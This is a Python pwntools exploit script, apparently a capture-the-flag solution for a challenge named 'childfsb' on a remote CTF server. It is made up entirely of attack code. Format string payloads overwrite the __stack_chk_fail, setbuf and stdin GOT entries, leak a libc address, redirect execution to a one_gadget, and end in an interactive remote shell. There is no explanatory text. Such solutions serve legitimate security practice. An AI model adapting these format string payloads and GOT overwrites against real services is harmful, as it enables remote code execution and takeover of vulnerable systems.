from pwn import * 

#p = process("./childfsb")
p = remote("ctf.j0n9hyun.xyz",3037)

one = [0x45216,0x4526a,0xf02a4,0xf1147]

offset = 0x20830
chk_got = 0x601020
ret = 0x0400780
setbuf_got = 0x601028
stdin_got = 0x601070 

# ---- return to main ----

payload ="%1918c  " #offset - 2 
payload += "%8$hn   "
payload += p64(chk_got)

p.sendlineafter("hello",payload) #overwrite stack_chk_fail's GOT -> main


# ---- leak libc ---- 

payload2 = "%12$lx  "
payload2 += "a"*16

p.sendlineafter("hello",payload2)
p.recvline()

leak = int(p.recv(12),16)
libc = leak-offset
one_gadget = ["",0,0]
one_gadget[0] = hex(libc+one[0])
one_gadget[1] = int(one_gadget[0][6:10],16)
one_gadget[2] = int(one_gadget[0][10:14],16)

log.info(hex(libc))

# ---- overwrite setbuf's GOT last 4byte ---- 

pstr = "%"+str(one_gadget[2]-1)+"c"

payload3 = pstr+" "*(8-len(pstr))
payload3 += "%10$hn  "
payload3 += p64(setbuf_got)



p.sendlineafter("hello",payload3)

for i in range(0,one_gadget[2]/1024) : 
    p.recv(1024)

# ---- overwrite setbuf's GOT first 4byte ---- 

pstr = "%"+str(one_gadget[1]-1)+"c"

payload3 = pstr+" "*(8-len(pstr))
payload3 += "%11$hn  "
payload3 += p64(setbuf_got+2)

p.sendlineafter("hello",payload3)

for i in range(0,one_gadget[1]/1024) : 
    p.recv(1024)
    
# ---- overwrite stdin's GOT ---- 

payload3 = "%11$ln  "
payload3 += p64(stdin_got)

p.sendlineafter("hello",payload3)

log.info(one_gadget) 
 
#---- return to init ----
 
payload = "%1828c  " #offset - 2 
payload += "%13$hn  "
payload += p64(chk_got)

#pause()

p.sendafter("hello",payload) #overwrite stack_chk_fail's GOT -> main

p.interactive()